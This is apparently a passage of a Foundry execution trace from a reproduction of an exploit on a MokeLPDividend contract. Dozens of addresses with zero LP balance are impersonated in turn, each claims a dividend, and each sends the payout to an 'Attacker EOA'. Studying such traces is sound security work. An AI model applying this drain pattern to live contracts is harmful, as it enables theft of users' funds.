+    │   │   ├─ emit DividendClaimed(param0: 0xfeb8907cB8F4dB64aCc4051c634fe990B823d378, param1: 25321642551741110179 [2.532e19])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x5026089b015e3638c1b52b63bde4027524c6ce03bb1a85cd63a73c170ab721b2: 0x0000000000000000000000000000000000000000000000485385102ba50edf5e → 0
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ [0] VM::prank(0xfeb8907cB8F4dB64aCc4051c634fe990B823d378)
+    │   └─ ← [Return]
+    ├─ [0] Attacker EOA::fallback{value: 25321647026591110179}()
+    │   └─ ← [Stop]
+    ├─ [49071] ContractTest::claimAs(0xa4Db6391B4C0478F502b0c18a7bEC6d82f6e2b82)
+    │   ├─ [0] VM::prank(0xa4Db6391B4C0478F502b0c18a7bEC6d82f6e2b82)
+    │   │   └─ ← [Return]
+    │   ├─ [47709] MokeLPDividend::claimDividend()
+    │   │   ├─ [2537] MOKE/WBNB LP::balanceOf(0xa4Db6391B4C0478F502b0c18a7bEC6d82f6e2b82) [staticcall]
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ emit UserLPSynced(param0: 0xa4Db6391B4C0478F502b0c18a7bEC6d82f6e2b82, param1: 1334183807563777105758 [1.334e21], param2: 0)
+    │   │   ├─ [0] 0xa4Db6391B4C0478F502b0c18a7bEC6d82f6e2b82::fallback{value: 25321642551741110179}()
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ emit DividendClaimed(param0: 0xa4Db6391B4C0478F502b0c18a7bEC6d82f6e2b82, param1: 25321642551741110179 [2.532e19])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x1c98acefef7b1ece145f1332ab5858a6c845772fe5356787e7ecb81fba3d3292: 0x0000000000000000000000000000000000000000000000485385102ba50edf5e → 0
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ [0] VM::prank(0xa4Db6391B4C0478F502b0c18a7bEC6d82f6e2b82)
+    │   └─ ← [Return]
+    ├─ [0] Attacker EOA::fallback{value: 25321647026591110179}()
+    │   └─ ← [Stop]
+    ├─ [49071] ContractTest::claimAs(0x80ee55911262eC5E6908707767F0f32c8998e512)
+    │   ├─ [0] VM::prank(0x80ee55911262eC5E6908707767F0f32c8998e512)
+    │   │   └─ ← [Return]
+    │   ├─ [47709] MokeLPDividend::claimDividend()
+    │   │   ├─ [2537] MOKE/WBNB LP::balanceOf(0x80ee55911262eC5E6908707767F0f32c8998e512) [staticcall]
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ emit UserLPSynced(param0: 0x80ee55911262eC5E6908707767F0f32c8998e512, param1: 1334183807563777105758 [1.334e21], param2: 0)
+    │   │   ├─ [0] 0x80ee55911262eC5E6908707767F0f32c8998e512::fallback{value: 25321642551741110179}()
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ emit DividendClaimed(param0: 0x80ee55911262eC5E6908707767F0f32c8998e512, param1: 25321642551741110179 [2.532e19])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x9b1a1726cda389cb33b77738efc02de06ecb1aaff839ddb10f9d56eaf001673f: 0x0000000000000000000000000000000000000000000000485385102ba50edf5e → 0
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ [0] VM::prank(0x80ee55911262eC5E6908707767F0f32c8998e512)
+    │   └─ ← [Return]
+    ├─ [0] Attacker EOA::fallback{value: 25321647026591110179}()
+    │   └─ ← [Stop]
+    ├─ [49071] ContractTest::claimAs(0x2fC160152074c27EC5b7Ba9b85058DF0bfce2FE1)
+    │   ├─ [0] VM::prank(0x2fC160152074c27EC5b7Ba9b85058DF0bfce2FE1)
+    │   │   └─ ← [Return]
+    │   ├─ [47709] MokeLPDividend::claimDividend()
+    │   │   ├─ [2537] MOKE/WBNB LP::balanceOf(0x2fC160152074c27EC5b7Ba9b85058DF0bfce2FE1) [staticcall]
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ emit UserLPSynced(param0: 0x2fC160152074c27EC5b7Ba9b85058DF0bfce2FE1, param1: 1334183807563777105758 [1.334e21], param2: 0)
+    │   │   ├─ [0] 0x2fC160152074c27EC5b7Ba9b85058DF0bfce2FE1::fallback{value: 25321642551741110179}()
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ emit DividendClaimed(param0: 0x2fC160152074c27EC5b7Ba9b85058DF0bfce2FE1, param1: 25321642551741110179 [2.532e19])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x9cdef5988fd955c05564b48dc42b87beeab82d7b8a4f47a9926c3f39636e1cc5: 0x0000000000000000000000000000000000000000000000485385102ba50edf5e → 0
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ [0] VM::prank(0x2fC160152074c27EC5b7Ba9b85058DF0bfce2FE1)
+    │   └─ ← [Return]
+    ├─ [0] Attacker EOA::fallback{value: 25321647026591110179}()
+    │   └─ ← [Stop]
+    ├─ [49071] ContractTest::claimAs(0x73DF41859c3a241B59626caAe588ef0F61d66D85)
+    │   ├─ [0] VM::prank(0x73DF41859c3a241B59626caAe588ef0F61d66D85)
+    │   │   └─ ← [Return]
+    │   ├─ [47709] MokeLPDividend::claimDividend()
+    │   │   ├─ [2537] MOKE/WBNB LP::balanceOf(0x73DF41859c3a241B59626caAe588ef0F61d66D85) [staticcall]
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ emit UserLPSynced(param0: 0x73DF41859c3a241B59626caAe588ef0F61d66D85, param1: 1334183807563777105758 [1.334e21], param2: 0)
+    │   │   ├─ [0] 0x73DF41859c3a241B59626caAe588ef0F61d66D85::fallback{value: 25321642551741110179}()
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ emit DividendClaimed(param0: 0x73DF41859c3a241B59626caAe588ef0F61d66D85, param1: 25321642551741110179 [2.532e19])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x0f40b8e1e55b7a5209d57c0da7d47c2575a74d8f66800bc3149cb5069a4b7b64: 0x0000000000000000000000000000000000000000000000485385102ba50edf5e → 0
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ [0] VM::prank(0x73DF41859c3a241B59626caAe588ef0F61d66D85)
+    │   └─ ← [Return]
+    ├─ [0] Attacker EOA::fallback{value: 25321647026591110179}()
+    │   └─ ← [Stop]
+    ├─ [49071] ContractTest::claimAs(0x62FeA93D39b3cCD8d240E738695bAEe95179f4BB)
+    │   ├─ [0] VM::prank(0x62FeA93D39b3cCD8d240E738695bAEe95179f4BB)
+    │   │   └─ ← [Return]
+    │   ├─ [47709] MokeLPDividend::claimDividend()
+    │   │   ├─ [2537] MOKE/WBNB LP::balanceOf(0x62FeA93D39b3cCD8d240E738695bAEe95179f4BB) [staticcall]
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ emit UserLPSynced(param0: 0x62FeA93D39b3cCD8d240E738695bAEe95179f4BB, param1: 1334183807563777105758 [1.334e21], param2: 0)
+    │   │   ├─ [0] 0x62FeA93D39b3cCD8d240E738695bAEe95179f4BB::fallback{value: 25321642551741110179}()
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ emit DividendClaimed(param0: 0x62FeA93D39b3cCD8d240E738695bAEe95179f4BB, param1: 25321642551741110179 [2.532e19])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x389b448d2f4e56f0cad66ff9c80d3ab7a8cf425bdeca89cd595abeecfb041f86: 0x0000000000000000000000000000000000000000000000485385102ba50edf5e → 0
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ [0] VM::prank(0x62FeA93D39b3cCD8d240E738695bAEe95179f4BB)
+    │   └─ ← [Return]
+    ├─ [0] Attacker EOA::fallback{value: 25321647026591110179}()
+    │   └─ ← [Stop]
+    ├─ [49071] ContractTest::claimAs(0x02473be9FbA39277B58844aeCcB8525341869943)
+    │   ├─ [0] VM::prank(0x02473be9FbA39277B58844aeCcB8525341869943)
+    │   │   └─ ← [Return]
+    │   ├─ [47709] MokeLPDividend::claimDividend()
+    │   │   ├─ [2537] MOKE/WBNB LP::balanceOf(0x02473be9FbA39277B58844aeCcB8525341869943) [staticcall]
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ emit UserLPSynced(param0: 0x02473be9FbA39277B58844aeCcB8525341869943, param1: 1334183807563777105758 [1.334e21], param2: 0)
+    │   │   ├─ [0] 0x02473be9FbA39277B58844aeCcB8525341869943::fallback{value: 25321642551741110179}()
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ emit DividendClaimed(param0: 0x02473be9FbA39277B58844aeCcB8525341869943, param1: 25321642551741110179 [2.532e19])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x8b57c7177d7f8b7d17b83f62f3ba0c4aebdfb9075041d1e811fb236c0f09526d: 0x0000000000000000000000000000000000000000000000485385102ba50edf5e → 0
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ [0] VM::prank(0x02473be9FbA39277B58844aeCcB8525341869943)
+    │   └─ ← [Return]
+    ├─ [0] Attacker EOA::fallback{value: 25321647026591110179}()
+    │   └─ ← [Stop]
+    ├─ [49071] ContractTest::claimAs(0x5B0b40F9852c306bfFEa0953F7cA2EB617ff6C77)
+    │   ├─ [0] VM::prank(0x5B0b40F9852c306bfFEa0953F7cA2EB617ff6C77)
+    │   │   └─ ← [Return]
+    │   ├─ [47709] MokeLPDividend::claimDividend()
+    │   │   ├─ [2537] MOKE/WBNB LP::balanceOf(0x5B0b40F9852c306bfFEa0953F7cA2EB617ff6C77) [staticcall]
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ emit UserLPSynced(param0: 0x5B0b40F9852c306bfFEa0953F7cA2EB617ff6C77, param1: 1334183807563777105758 [1.334e21], param2: 0)
+    │   │   ├─ [0] 0x5B0b40F9852c306bfFEa0953F7cA2EB617ff6C77::fallback{value: 25321642551741110179}()
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ emit DividendClaimed(param0: 0x5B0b40F9852c306bfFEa0953F7cA2EB617ff6C77, param1: 25321642551741110179 [2.532e19])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xc09716dcd5c96926fb4f818e8c6b0cde38a7a8db23f6f88ec84a1242b84ce6ed: 0x0000000000000000000000000000000000000000000000485385102ba50edf5e → 0
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ [0] VM::prank(0x5B0b40F9852c306bfFEa0953F7cA2EB617ff6C77)
+    │   └─ ← [Return]
+    ├─ [0] Attacker EOA::fallback{value: 25321647026591110179}()
+    │   └─ ← [Stop]
+    ├─ [49071] ContractTest::claimAs(0xE89a82D955561361c021141c30d849C063935A8f)
+    │   ├─ [0] VM::prank(0xE89a82D955561361c021141c30d849C063935A8f)
+    │   │   └─ ← [Return]
+    │   ├─ [47709] MokeLPDividend::claimDividend()
+    │   │   ├─ [2537] MOKE/WBNB LP::balanceOf(0xE89a82D955561361c021141c30d849C063935A8f) [staticcall]
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ emit UserLPSynced(param0: 0xE89a82D955561361c021141c30d849C063935A8f, param1: 1334183807563777105758 [1.334e21], param2: 0)
+    │   │   ├─ [0] 0xE89a82D955561361c021141c30d849C063935A8f::fallback{value: 25321642551741110179}()
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ emit DividendClaimed(param0: 0xE89a82D955561361c021141c30d849C063935A8f, param1: 25321642551741110179 [2.532e19])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xaf4a21ae2538b5ca98262f5e3df0df7f6c62a58532f9dc3dd1f8415f1eb50641: 0x0000000000000000000000000000000000000000000000485385102ba50edf5e → 0
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ [0] VM::prank(0xE89a82D955561361c021141c30d849C063935A8f)
+    │   └─ ← [Return]
+    ├─ [0] Attacker EOA::fallback{value: 25321647026591110179}()
+    │   └─ ← [Stop]
+    ├─ [49071] ContractTest::claimAs(0x013B889dCbD56aFc5FC245081B725B4fe7422a7E)
+    │   ├─ [0] VM::prank(0x013B889dCbD56aFc5FC245081B725B4fe7422a7E)
+    │   │   └─ ← [Return]
+    │   ├─ [47709] MokeLPDividend::claimDividend()
+    │   │   ├─ [2537] MOKE/WBNB LP::balanceOf(0x013B889dCbD56aFc5FC245081B725B4fe7422a7E) [staticcall]
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ emit UserLPSynced(param0: 0x013B889dCbD56aFc5FC245081B725B4fe7422a7E, param1: 1334183807563777105758 [1.334e21], param2: 0)
+    │   │   ├─ [0] 0x013B889dCbD56aFc5FC245081B725B4fe7422a7E::fallback{value: 25321642551741110179}()
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ emit DividendClaimed(param0: 0x013B889dCbD56aFc5FC245081B725B4fe7422a7E, param1: 25321642551741110179 [2.532e19])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x5e496c235c56b90d0488dbd7a5329b29f2e2ad7e9b297c5fd041f8e8bca54fc4: 0x0000000000000000000000000000000000000000000000485385102ba50edf5e → 0
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ [0] VM::prank(0x013B889dCbD56aFc5FC245081B725B4fe7422a7E)
+    │   └─ ← [Return]
+    ├─ [0] Attacker EOA::fallback{value: 25321647026591110179}()
+    │   └─ ← [Stop]
+    ├─ [49071] ContractTest::claimAs(0x6cdB79f4f5e8E09a4Cc230548f244DD0467e91eD)
+    │   ├─ [0] VM::prank(0x6cdB79f4f5e8E09a4Cc230548f244DD0467e91eD)
+    │   │   └─ ← [Return]
+    │   ├─ [47709] MokeLPDividend::claimDividend()
+    │   │   ├─ [2537] MOKE/WBNB LP::balanceOf(0x6cdB79f4f5e8E09a4Cc230548f244DD0467e91eD) [staticcall]
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ emit UserLPSynced(param0: 0x6cdB79f4f5e8E09a4Cc230548f244DD0467e91eD, param1: 1334183807563777105758 [1.334e21], param2: 0)
+    │   │   ├─ [0] 0x6cdB79f4f5e8E09a4Cc230548f244DD0467e91eD::fallback{value: 25321642551741110179}()
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ emit DividendClaimed(param0: 0x6cdB79f4f5e8E09a4Cc230548f244DD0467e91eD, param1: 25321642551741110179 [2.532e19])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xc912074f8c9df95405b321b947bbfa769659dbdc32d1259bc0a264474fb02e87: 0x0000000000000000000000000000000000000000000000485385102ba50edf5e → 0
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ [0] VM::prank(0x6cdB79f4f5e8E09a4Cc230548f244DD0467e91eD)
+    │   └─ ← [Return]
+    ├─ [0] Attacker EOA::fallback{value: 25321647026591110179}()
+    │   └─ ← [Stop]
+    ├─ [49071] ContractTest::claimAs(0xf45aA35652d2ba18AccFCb3737C529210e009eeE)
+    │   ├─ [0] VM::prank(0xf45aA35652d2ba18AccFCb3737C529210e009eeE)
+    │   │   └─ ← [Return]
+    │   ├─ [47709] MokeLPDividend::claimDividend()
+    │   │   ├─ [2537] MOKE/WBNB LP::balanceOf(0xf45aA35652d2ba18AccFCb3737C529210e009eeE) [staticcall]
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ emit UserLPSynced(param0: 0xf45aA35652d2ba18AccFCb3737C529210e009eeE, param1: 1334183807563777105758 [1.334e21], param2: 0)
+    │   │   ├─ [0] 0xf45aA35652d2ba18AccFCb3737C529210e009eeE::fallback{value: 25321642551741110179}()
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ emit DividendClaimed(param0: 0xf45aA35652d2ba18AccFCb3737C529210e009eeE, param1: 25321642551741110179 [2.532e19])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x3810862a71571826c701a58ae521e71dbc07dd76dc721f17eb83c822781c4c78: 0x0000000000000000000000000000000000000000000000485385102ba50edf5e → 0
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ [0] VM::prank(0xf45aA35652d2ba18AccFCb3737C529210e009eeE)
+    │   └─ ← [Return]
+    ├─ [0] Attacker EOA::fallback{value: 25321647026591110179}()
+    │   └─ ← [Stop]
+    ├─ [49071] ContractTest::claimAs(0x0192551a93A17260Cdb0095ff9df8f658aBe16e5)
+    │   ├─ [0] VM::prank(0x0192551a93A17260Cdb0095ff9df8f658aBe16e5)
+    │   │   └─ ← [Return]
+    │   ├─ [47709] MokeLPDividend::claimDividend()
+    │   │   ├─ [2537] MOKE/WBNB LP::balanceOf(0x0192551a93A17260Cdb0095ff9df8f658aBe16e5) [staticcall]
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ emit UserLPSynced(param0: 0x0192551a93A17260Cdb0095ff9df8f658aBe16e5, param1: 1334183807563777105758 [1.334e21], param2: 0)
+    │   │   ├─ [0] 0x0192551a93A17260Cdb0095ff9df8f658aBe16e5::fallback{value: 25321642551741110179}()
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ emit DividendClaimed(param0: 0x0192551a93A17260Cdb0095ff9df8f658aBe16e5, param1: 25321642551741110179 [2.532e19])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x94d5c8db8c53d972921300f6f74bb6c9bec6effc20289dba131cdaea5d2b1af8: 0x0000000000000000000000000000000000000000000000485385102ba50edf5e → 0
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ [0] VM::prank(0x0192551a93A17260Cdb0095ff9df8f658aBe16e5)
+    │   └─ ← [Return]
+    ├─ [0] Attacker EOA::fallback{value: 25321647026591110179}()
+    │   └─ ← [Stop]
+    ├─ [49071] ContractTest::claimAs(0x1bD64122fcFe1a12503218CB82019b6c680D269B)
+    │   ├─ [0] VM::prank(0x1bD64122fcFe1a12503218CB82019b6c680D269B)
+    │   │   └─ ← [Return]
+    │   ├─ [47709] MokeLPDividend::claimDividend()
+    │   │   ├─ [2537] MOKE/WBNB LP::balanceOf(0x1bD64122fcFe1a12503218CB82019b6c680D269B) [staticcall]
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ emit UserLPSynced(param0: 0x1bD64122fcFe1a12503218CB82019b6c680D269B, param1: 1334183807563777105758 [1.334e21], param2: 0)
+    │   │   ├─ [0] 0x1bD64122fcFe1a12503218CB82019b6c680D269B::fallback{value: 25321642551741110179}()
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ emit DividendClaimed(param0: 0x1bD64122fcFe1a12503218CB82019b6c680D269B, param1: 25321642551741110179 [2.532e19])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x6637745f83b2dc9c8532c01aa0bccf77b1721c3a670c622a214fc7bfe53886e8: 0x0000000000000000000000000000000000000000000000485385102ba50edf5e → 0
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ [0] VM::prank(0x1bD64122fcFe1a12503218CB82019b6c680D269B)
+    │   └─ ← [Return]
+    ├─ [0] Attacker EOA::fallback{value: 25321647026591110179}()
+    │   └─ ← [Stop]
+    ├─ [49071] ContractTest::claimAs(0x3Cf2929B976bE530ae12898Bb30911fB9B7F9F82)
+    │   ├─ [0] VM::prank(0x3Cf2929B976bE530ae12898Bb30911fB9B7F9F82)
+    │   │   └─ ← [Return]
+    │   ├─ [47709] MokeLPDividend::claimDividend()
+    │   │   ├─ [2537] MOKE/WBNB LP::balanceOf(0x3Cf2929B976bE530ae12898Bb30911fB9B7F9F82) [staticcall]
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ emit UserLPSynced(param0: 0x3Cf2929B976bE530ae12898Bb30911fB9B7F9F82, param1: 1334183807563777105758 [1.334e21], param2: 0)
+    │   │   ├─ [0] 0x3Cf2929B976bE530ae12898Bb30911fB9B7F9F82::fallback{value: 25321642551741110179}()
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ emit DividendClaimed(param0: 0x3Cf2929B976bE530ae12898Bb30911fB9B7F9F82, param1: 25321642551741110179 [2.532e19])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x81fff2cb14968d0973b9c4bc44dd646b7b1ae471186d4a102229f66b72fe8ca8: 0x0000000000000000000000000000000000000000000000485385102ba50edf5e → 0
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ [0] VM::prank(0x3Cf2929B976bE530ae12898Bb30911fB9B7F9F82)
+    │   └─ ← [Return]
+    ├─ [0] Attacker EOA::fallback{value: 25321647026591110179}()
+    │   └─ ← [Stop]
+    ├─ [49071] ContractTest::claimAs(0x5DA6B253a7646679DC981a76E2d56430caA9f18a)
+    │   ├─ [0] VM::prank(0x5DA6B253a7646679DC981a76E2d56430caA9f18a)
+    │   │   └─ ← [Return]
+    │   ├─ [47709] MokeLPDividend::claimDividend()
+    │   │   ├─ [2537] MOKE/WBNB LP::balanceOf(0x5DA6B253a7646679DC981a76E2d56430caA9f18a) [staticcall]
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ emit UserLPSynced(param0: 0x5DA6B253a7646679DC981a76E2d56430caA9f18a, param1: 1334183807563777105758 [1.334e21], param2: 0)
+    │   │   ├─ [0] 0x5DA6B253a7646679DC981a76E2d56430caA9f18a::fallback{value: 25321642551741110179}()
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ emit DividendClaimed(param0: 0x5DA6B253a7646679DC981a76E2d56430caA9f18a, param1: 25321642551741110179 [2.532e19])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xed0dae46cdad574f95b2edcdf7a6eaf8cf26fe15ebc3cd6017778e880f4d537a: 0x0000000000000000000000000000000000000000000000485385102ba50edf5e → 0
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ [0] VM::prank(0x5DA6B253a7646679DC981a76E2d56430caA9f18a)
+    │   └─ ← [Return]
+    ├─ [0] Attacker EOA::fallback{value: 25321647026591110179}()
+    │   └─ ← [Stop]
+    ├─ [49071] ContractTest::claimAs(0x81003e66fb79886e4aBB41491646dE771B38D761)
+    │   ├─ [0] VM::prank(0x81003e66fb79886e4aBB41491646dE771B38D761)
+    │   │   └─ ← [Return]
+    │   ├─ [47709] MokeLPDividend::claimDividend()
+    │   │   ├─ [2537] MOKE/WBNB LP::balanceOf(0x81003e66fb79886e4aBB41491646dE771B38D761) [staticcall]
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ emit UserLPSynced(param0: 0x81003e66fb79886e4aBB41491646dE771B38D761, param1: 1334183807563777105758 [1.334e21], param2: 0)
+    │   │   ├─ [0] 0x81003e66fb79886e4aBB41491646dE771B38D761::fallback{value: 25321642551741110179}()
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ emit DividendClaimed(param0: 0x81003e66fb79886e4aBB41491646dE771B38D761, param1: 25321642551741110179 [2.532e19])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x169d86d76acd31224ee4f3825064d616146647f76e631818d0076fcc8efca1c5: 0x0000000000000000000000000000000000000000000000485385102ba50edf5e → 0
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ [0] VM::prank(0x81003e66fb79886e4aBB41491646dE771B38D761)
+    │   └─ ← [Return]
+    ├─ [0] Attacker EOA::fallback{value: 25321647026591110179}()
+    │   └─ ← [Stop]
+    ├─ [49071] ContractTest::claimAs(0xf2e12f27C56Ad8Eb6C8b464EE2Ff57D79Ff6f467)
+    │   ├─ [0] VM::prank(0xf2e12f27C56Ad8Eb6C8b464EE2Ff57D79Ff6f467)
+    │   │   └─ ← [Return]
+    │   ├─ [47709] MokeLPDividend::claimDividend()
+    │   │   ├─ [2537] MOKE/WBNB LP::balanceOf(0xf2e12f27C56Ad8Eb6C8b464EE2Ff57D79Ff6f467) [staticcall]
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ emit UserLPSynced(param0: 0xf2e12f27C56Ad8Eb6C8b464EE2Ff57D79Ff6f467, param1: 1334183807563777105758 [1.334e21], param2: 0)
+    │   │   ├─ [0] 0xf2e12f27C56Ad8Eb6C8b464EE2Ff57D79Ff6f467::fallback{value: 25321642551741110179}()
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ emit DividendClaimed(param0: 0xf2e12f27C56Ad8Eb6C8b464EE2Ff57D79Ff6f467, param1: 25321642551741110179 [2.532e19])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xa374b644013792e383d7c5ec809b7e0019a568f587b8aff87b9c30ef7db21c17: 0x0000000000000000000000000000000000000000000000485385102ba50edf5e → 0
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ [0] VM::prank(0xf2e12f27C56Ad8Eb6C8b464EE2Ff57D79Ff6f467)
+    │   └─ ← [Return]
+    ├─ [0] Attacker EOA::fallback{value: 25321647026591110179}()
+    │   └─ ← [Stop]
+    ├─ [49071] ContractTest::claimAs(0x0313e270d84cBBa886BB56737C82F2f97ba40BF9)
+    │   ├─ [0] VM::prank(0x0313e270d84cBBa886BB56737C82F2f97ba40BF9)
+    │   │   └─ ← [Return]
+    │   ├─ [47709] MokeLPDividend::claimDividend()
+    │   │   ├─ [2537] MOKE/WBNB LP::balanceOf(0x0313e270d84cBBa886BB56737C82F2f97ba40BF9) [staticcall]
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ emit UserLPSynced(param0: 0x0313e270d84cBBa886BB56737C82F2f97ba40BF9, param1: 1334183807563777105758 [1.334e21], param2: 0)
+    │   │   ├─ [0] 0x0313e270d84cBBa886BB56737C82F2f97ba40BF9::fallback{value: 25321642551741110179}()
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ emit DividendClaimed(param0: 0x0313e270d84cBBa886BB56737C82F2f97ba40BF9, param1: 25321642551741110179 [2.532e19])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xd627e86614485bf7552a42ece810575dc32ffba4df6111b1f38b7c5c148340a5: 0x0000000000000000000000000000000000000000000000485385102ba50edf5e → 0
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ [0] VM::prank(0x0313e270d84cBBa886BB56737C82F2f97ba40BF9)
+    │   └─ ← [Return]
+    ├─ [0] Attacker EOA::fallback{value: 25321647026591110179}()
+    │   └─ ← [Stop]
+    ├─ [49071] ContractTest::claimAs(0xa4BF270000dADBC9471336D9fb813De9333477C7)
+    │   ├─ [0] VM::prank(0xa4BF270000dADBC9471336D9fb813De9333477C7)
+    │   │   └─ ← [Return]
+    │   ├─ [47709] MokeLPDividend::claimDividend()
+    │   │   ├─ [2537] MOKE/WBNB LP::balanceOf(0xa4BF270000dADBC9471336D9fb813De9333477C7) [staticcall]
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ emit UserLPSynced(param0: 0xa4BF270000dADBC9471336D9fb813De9333477C7, param1: 1334183807563777105758 [1.334e21], param2: 0)
+    │   │   ├─ [0] 0xa4BF270000dADBC9471336D9fb813De9333477C7::fallback{value: 25321642551741110179}()
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ emit DividendClaimed(param0: 0xa4BF270000dADBC9471336D9fb813De9333477C7, param1: 25321642551741110179 [2.532e19])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xf814a1846d9dda6d559401ae04ecaf235ef1f849f3b49267df759c0a4162d0cf: 0x0000000000000000000000000000000000000000000000485385102ba50edf5e → 0
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ [0] VM::prank(0xa4BF270000dADBC9471336D9fb813De9333477C7)
+    │   └─ ← [Return]
+    ├─ [0] Attacker EOA::fallback{value: 25321647026591110179}()
+    │   └─ ← [Stop]
+    ├─ [49071] ContractTest::claimAs(0x2571fc590aCb077798192A567840bAE7086cc4E5)
+    │   ├─ [0] VM::prank(0x2571fc590aCb077798192A567840bAE7086cc4E5)
+    │   │   └─ ← [Return]
+    │   ├─ [47709] MokeLPDividend::claimDividend()
+    │   │   ├─ [2537] MOKE/WBNB LP::balanceOf(0x2571fc590aCb077798192A567840bAE7086cc4E5) [staticcall]
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ emit UserLPSynced(param0: 0x2571fc590aCb077798192A567840bAE7086cc4E5, param1: 1334183807563777105758 [1.334e21], param2: 0)
+    │   │   ├─ [0] 0x2571fc590aCb077798192A567840bAE7086cc4E5::fallback{value: 25321642551741110179}()
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ emit DividendClaimed(param0: 0x2571fc590aCb077798192A567840bAE7086cc4E5, param1: 25321642551741110179 [2.532e19])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xcc6685e9ec7a66f9b6999b583f1e3fa990e5398473c7b9851f12cda0c82f486c: 0x0000000000000000000000000000000000000000000000485385102ba50edf5e → 0
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ [0] VM::prank(0x2571fc590aCb077798192A567840bAE7086cc4E5)
+    │   └─ ← [Return]
+    ├─ [0] Attacker EOA::fallback{value: 25321647026591110179}()
+    │   └─ ← [Stop]
+    ├─ [49071] ContractTest::claimAs(0x353e1a32cFF866F96b804Df3ed25bec9F91e3229)
+    │   ├─ [0] VM::prank(0x353e1a32cFF866F96b804Df3ed25bec9F91e3229)
+    │   │   └─ ← [Return]
+    │   ├─ [47709] MokeLPDividend::claimDividend()
+    │   │   ├─ [2537] MOKE/WBNB LP::balanceOf(0x353e1a32cFF866F96b804Df3ed25bec9F91e3229) [staticcall]
+    │   │   │   └─ ← [Return] 0
+    │   │   ├─ emit UserLPSynced(param0: 0x353e1a32cFF866F96b804Df3ed25bec9F91e3229, param1: 1334183807563777105758 [1.334e21], param2: 0)
+    │   │   ├─ [0] 0x353e1a32cFF866F96b804Df3ed25bec9F91e3229::fallback{value: 25321642551741110179}()
+    │   │   │   └─ ← [Stop]
